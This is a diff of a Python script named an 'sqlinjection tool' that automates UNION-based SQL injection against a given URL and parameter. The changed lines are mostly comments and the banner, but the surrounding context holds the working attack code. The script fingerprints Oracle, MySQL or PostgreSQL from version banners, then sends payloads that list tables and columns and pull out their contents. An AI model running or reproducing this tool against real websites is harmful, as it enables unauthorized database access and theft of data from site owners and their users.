@@ -1,6 +1,4 @@
 print(''' 
-
-
         ___       _        _        _           _   _             
        / _ \  ___| |_ ___ (_)_ __  (_) ___  ___| |_(_) ___  _ __  
       | | | |/ __| __/ _ \| | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
@@ -9,9 +7,8 @@ print('''
                                   |__/                            
  
            |----------------------------------------------|
-           |--- sqlinjection tool by Octopus and Koala ---|
+           |------- sqlinjection tool by Octopus ---------|
            |----------------------------------------------|
-
 ''')
 
 # import the libraries
@@ -23,7 +20,7 @@ from rich import print
 from rich.console import Console
 from rich.style import Style
 
-# control of input 
+# we check the input given by the user
 
 if(len(sys.argv) == 3) :
     url = sys.argv[1]
@@ -33,7 +30,7 @@ if(len(sys.argv) == 3) :
     if(request.ok) :
         print("[green4][+][/green4] [yellow3]The connection with website is good[/yellow3]")
         time.sleep(2)
-        # enumeration of input data
+        # enumeration of null value  
         print("[green4][+][/green4] [yellow3]Starting the enumeration of input data[/yellow3]")
         time.sleep(2)
         error = False 
@@ -46,7 +43,7 @@ if(len(sys.argv) == 3) :
         time.sleep(2)
         print(f"[green4][+][/green4] [yellow3]The number of input data are[/yellow3] [b]{counter - 1}[/b]")
         counter = counter - 1 
-        #examing the type of database 
+        # examing the type of database 
         if(counter == 2) :
             request = requests.get(url+injection_point+f"'+UNION+SELECT+BANNER,+NULL+FROM+v$version--")
             if("Oracle" in request.text) :
@@ -60,6 +57,7 @@ if(len(sys.argv) == 3) :
             if("PostgreSQL" in request.text) :
                 print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Postgre[/b][/orange3] [yellow3]![/yellow3]")
                 db_type = "Postgre"
+        # examing the type of database when cunter = 3
         if(counter == 3):
             request = requests.get(url+injection_point+f"' UNION SELECT null,NULL,BANNER FROM v$version--")
             if("Oracle" in request.text) :
@@ -73,17 +71,21 @@ if(len(sys.argv) == 3) :
             if("PostgreSQL" in request.text) :
                 print("[green4][+][/green4] [yellow3]The type of database is[/yellow3] [orange3][b]Postgre[/b][/orange3] [yellow3]![/yellow3]")
                 db_type = "Postgre"
+
+
+
         #start the sql injection attack !
     
         time.sleep(3)
 
         #start attack if the database is Postre,mysql or Microsoft 
         if (db_type == "mysql" or db_type == "Postgre") :
+
+            # start attack if the database is Postre,mysql or Microsoft and counter = 2 
             if (counter == 2) :
                 payload_1 = "'union select null,table_name from information_schema.tables--'"
                 tables_injection = requests.get(url+injection_point+payload_1)
 
-                # MY PROGRAMM PART
                 print('\n\n[b][green]--------------------[/green][/b][b][green]--------------------[/green][/b]')
                 text = tables_injection.text
                 get = False
@@ -108,7 +110,6 @@ if(len(sys.argv) == 3) :
                 print("\n[green4][+][/green4] [yellow3]enter the table to be scanned[/yellow3]")
                 tabella = str(input('---> '))
                 payload_2 = f"'union select null,column_name from information_schema.columns where table_name = '{tabella}'--"
-                #print(f"{url}{injection_point}{payload_2}")
                 time.sleep(2)
                 print("\n[green4][+][/green4] [yellow3]injection attack started[/yellow3]\n\n")
                 time.sleep(1)
@@ -171,6 +172,9 @@ if(len(sys.argv) == 3) :
 
 
                 print("[green4]FINISHED PROGRAM[/green4]")
+
+
+                # start attack if the database is Postre,mysql or Microsoft and counter = 3
             if (counter == 3) :
                 payload_1 = "'union select null,null,table_name from information_schema.tables--'"
                 tables_injection = requests.get(url+injection_point+payload_1)
@@ -202,7 +206,6 @@ if(len(sys.argv) == 3) :
                 print("\n[green4][+][/green4]enter the table to be scanned !![yellow3][/yellow3]")
                 tabella = str(input('---> '))
                 payload_2 = f"'union select null,null,column_name from information_schema.columns where table_name = '{tabella}'--"
-                #print(f"{url}{injection_point}{payload_2}")
                 time.sleep(2)
                 print("\n [green4][+][/green4] attacco di injection iniziato\n\n")
                 time.sleep(1)
@@ -264,8 +267,9 @@ if(len(sys.argv) == 3) :
 
                 print("[green4]FINISHED PROGRAM[/green4]")
             
-            #start the attack when the database is Oracle 
+        # start the attack when the database is Oracle 
         if (db_type == "Oracle") :
+            # start the attack when the database is Oracle and counter = 2 
             if (counter == 2) :
                 payload_1 = "'union select null,table_name from all_tables--'"
                 tables_injection = requests.get(url+injection_point+payload_1)
@@ -296,7 +300,6 @@ if(len(sys.argv) == 3) :
                 print("\n[green4][+][/green4] [yellow3]Enter the table to be scanned[/yellow3]")
                 tabella = str(input('---> '))
                 payload_2 = f"'union select null,column_name from all_tab_columns where table_name = '{tabella}'--"
-                #print(f"{url}{injection_point}{payload_2}")
                 time.sleep(2)
                 print("\n[green4][+][/green4]injection attack started\n\n")
                 time.sleep(1)
@@ -358,6 +361,11 @@ if(len(sys.argv) == 3) :
 
 
                 print("[green4]FINISHED PROGRAM[/green4]")
+
+
+
+
+                # start the attack when the database is Oracle and counter = 2 
             if (counter == 3) :
                 payload_1 = "'union select null,null,table_name from all_tables--'"
                 tables_injection = requests.get(url+injection_point+payload_1)
@@ -389,7 +397,6 @@ if(len(sys.argv) == 3) :
                 print('[red1][-][/red1]')
                 tabella = str(input('---> '))
                 payload_2 = f"'union select null,null,column_name from all_tab_columns where table_name = '{tabella}'--"
-                #print(f"{url}{injection_point}{payload_2}")
                 time.sleep(2)
                 print("\n[green4][+][/green4]injection attack started\n\n")
                 time.sleep(1)
